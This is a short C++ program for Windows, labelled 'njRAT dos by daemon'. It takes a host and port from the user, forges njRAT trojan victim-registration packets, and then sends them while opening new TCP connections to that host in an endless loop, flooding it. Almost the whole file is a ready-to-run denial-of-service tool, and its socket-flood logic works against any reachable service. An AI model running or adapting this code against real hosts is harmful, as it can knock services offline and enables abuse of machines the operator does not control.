#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include<stdio.h>
#include <string>
#include <iostream>
#include <sstream>
#include<winsock2.h>
#include <cassert>

#pragma comment(lib,"ws2_32.lib")
std::string constructpayload(std::string pcn, std::string usr, std::string date,std::string country, std::string os, std::string webcam, std::string njrver) {
	std::string header = "lv";
	std::string delimiter = "|'|'|";
	std::string packet = header + delimiter + "0" + delimiter + pcn + delimiter + usr + delimiter + date + delimiter + country + delimiter + os + delimiter + webcam + delimiter + njrver + delimiter + "00" + delimiter + "0" + delimiter + "0,0,[endof]";
	return packet;
}

void main(int argc, char *argv[])
{
	WSADATA wsa;
	SOCKET s[131070];
	int z = 0;
	struct sockaddr_in server;
	std::string target = "";
	std::string port = "";
	WSAStartup(MAKEWORD(2, 2), &wsa);
	printf("njRAT dos by daemon\n");
	//Create a socket
	s[z] = socket(AF_INET, SOCK_STREAM, 0);
	printf("Input njRAT host: ");
	std::getline(std::cin, target);
	printf("Input njRAT port: ");
	std::getline(std::cin, port);
	server.sin_addr.s_addr = inet_addr(target.c_str());
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(port.c_str()));

	//Connect to remote server
	if (connect(s[z], (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		puts("Could not connect to the njRAT host... Press enter to continue anyways");
		getchar();
	}
	puts("Connected, preparing payload.");
	std::string payload = constructpayload("you", "are", "a", "horrible", "person", ".", "."); // we weren't even testing for that
	puts("Payload ready.");
	send(s[0], payload.c_str(), payload.length(), 0);
	
		while (true) {
			send(s[z], payload.c_str(), payload.length(), 0);
			s[z] = socket(AF_INET, SOCK_STREAM, 0);
			if (connect(s[z], (struct sockaddr *)&server, sizeof(server)) < 0)
			{
				puts("[+] Success.");
			}
			z++;
			Sleep(4);
			assert(z < 131070);
		}
		system("pause");
	}